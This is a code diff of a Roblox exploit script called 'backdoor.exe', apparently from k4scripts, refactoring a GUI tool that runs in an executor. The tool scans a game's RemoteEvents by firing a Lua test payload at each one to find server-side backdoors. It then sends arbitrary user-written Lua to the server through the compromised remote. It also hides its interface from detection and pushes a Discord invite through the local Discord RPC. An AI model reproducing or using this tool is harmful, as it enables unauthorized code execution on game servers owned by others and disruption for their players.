@@ -17,42 +17,47 @@
 ]]
 
 
-local LocalPlayer = game.Players.LocalPlayer
-local guiDestination = game.CoreGui.RobloxGui
-local salt = "12623546126"
+local localPlayer = game.Players.LocalPlayer
+local UI_PARENT = game.CoreGui.RobloxGui
+local SALT = "12623546126"
+local INV_CODE = "6HndYgC"
 
-local function notify(text)
+local function notify(text,cb,b1,b2)
 	game.StarterGui:SetCore(
 		"SendNotification",{
-			Title = "Backdoor.exe",
+			Title = "backdoor.exe",
+			Duration = 3,
 			Text = text,
+			Callback = cb,
+			Button1 = b1,
+			Button2 = b2
 		}
 	)
 end
 
 -- Removing dubs
-for _, gui in pairs(guiDestination:GetChildren()) do
-	if gui:IsA("ScreenGui") and string.match(gui.Name, salt) then
-		gui:Destroy()
+for _, ui in pairs(UI_PARENT:GetChildren()) do
+	if ui:IsA("ScreenGui") and string.match(ui.Name, SALT) then
+		ui:Destroy()
 	end
 end
 
 
-local assetId = "rbxassetid://7062870440"
-local GUI = game:GetObjects(assetId)[1]
-if syn then syn.protect_gui(GUI) end
-GUI.Parent = guiDestination
-GUI.Name = salt..tostring(math.random(100000000,1000000000))
+local ASSET_ID = "rbxassetid://7062870440"
+local UI = game:GetObjects(ASSET_ID)[1]
+if syn then syn.protect_gui(UI) end
+UI.Parent = UI_PARENT
+UI.Name = SALT..tostring(math.random(100000000,1000000000))
 
 
 local function findObject(name, type)
-	 for i, object in pairs(GUI:GetDescendants()) do
+	 for i, object in pairs(UI:GetDescendants()) do
 		if object.Name == name and object.ClassName == type then return object end
 	 end
 end
 
-GUI.Main.Active = true
-GUI.Main.Draggable = true
+UI.Main.Active = true
+UI.Main.Draggable = true
 
 -- Top Bar
 local closeButton = findObject("Close_Button","ImageButton")
@@ -96,7 +101,7 @@ local function changeUiState()
 	statusColor.BackgroundColor3 = attachColors[tostring(BackdoorUI.attached)]
 	statusText.Text = attachTexts[tostring(BackdoorUI.attached)]
 
-	if BackdoorUI.attached == true then
+	if BackdoorUI.attached then
 		notify("Backdoor Found")
 	end
 end
@@ -124,19 +129,34 @@ local function check(vn)
 	end
 end
 
+local function remoteCheck(rm)
+	local fullName =  rm:GetFullName()
+
+	if string.find(fullName, "DefaultChat") then return false end
+	if string.find(fullName, localPlayer.Name) then return false end
+	if rm:FindFirstChild("__FUNCTION") then return false end
+
+	if getgenv().blacklisted then
+		if table.find(getgenv().blacklisted, fullName) then return false end
+	end
+	return true
+	
+end
+
 local function scan()
-	if BackdoorUI.scanning == true then return end
-	if BackdoorUI.attached == true then changeUiState() end
+	if BackdoorUI.scanning then return end
+	if BackdoorUI.attached then changeUiState() end
 
 	BackdoorUI.scanning = true
 	statusText.Text = "Scanning"
-	local valueName = salt..math.random(100000, 999999)
+	local valueName = SALT..math.random(100000, 999999)
 
 	for _, testRemote in pairs(game:GetDescendants()) do
 		if testRemote.ClassName == "RemoteEvent" and BackdoorUI.attached == false then
-			local testScript = "i=Instance.new('StringValue',workspace) i.Name='"..valueName.."' i.Value='"..testRemote:GetFullName().."'"
+			local testScript = "i=Instance.new('StringValue',workspace) i.Name='"..
+								valueName.."' i.Value='"..testRemote:GetFullName().."'"
 
-			if not getgenv().blacklisted or not table.find(getgenv().blacklisted, testRemote:GetFullName()) then
+			if remoteCheck(testRemote) then
 				testRemote:FireServer(testScript)
 			end
 
@@ -171,19 +191,10 @@ local function executeScript()
 		end
 	end
 
-	local bf = Instance.new("BindableFunction")
-	bf.OnInvoke = callback
+	local bf = Instance.new("BindableFunction"); bf.OnInvoke = callback
 
-	if BackdoorUI.attached == false then
-		game.StarterGui:SetCore(
-			"SendNotification",{
-				Title = "backdoor.exe",
-				Text = "You're not attached.\nWould you like to attach now?",
-				Callback = bf,
-				Button1 = "Yes",
-				Button2 = "No"
-			}
-		)
+	if not BackdoorUI.attached then
+		notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
 	else
 		BackdoorUI.backdoorRemote:FireServer(source.Text)
 	end
@@ -194,7 +205,7 @@ local function promtDicordInvite(invCode)
     local httpService = game:GetService("HttpService")
     local httpRequest = (syn and syn.request) or (httpService and httpService.request) or http_request
 
-    if not httpRequest then print("Exploit not supported. No HTTP found.") return end
+    if not httpRequest then notify("Invite code copied!"); setclipboard(invCode) return end
     
     httpRequest({
         Url = "http://127.0.0.1:6463/rpc?v=1",
@@ -206,21 +217,22 @@ local function promtDicordInvite(invCode)
         },
 
         Body = httpService:JSONEncode({
+            args = {code = invCode},
             cmd = 'INVITE_BROWSER',
-            nonce = httpService:GenerateGUID(false),
-            args = {code = invCode}
+            nonce = httpService:GenerateGUID(false)
         })
-        
     })
+	notify("You have been promted to join our Discord. Open your Discord.")
 end
 
 -- Buttons
-closeButton.MouseButton1Click:Connect(function() GUI:Destroy() end)
+closeButton.MouseButton1Click:Connect(function() UI:Destroy() end)
 scanButton.MouseButton1Click:Connect(scan)
 executeButton.MouseButton1Click:Connect(executeScript)
 clearButton.MouseButton1Click:Connect(function() source.Text = ""  end)
 hideButton.MouseButton1Click:Connect(function() sourceFrame.Visible = not sourceFrame.Visible end)
-inviteButton.MouseButton1Click:Connect(function() promtDicordInvite("6HndYgC") end)
+inviteButton.MouseButton1Click:Connect(function() promtDicordInvite(INV_CODE) end)
+notify("Make sure to join our Discord!\nCode: "..INV_CODE)
 
 --	k4scripts
 --	.------.
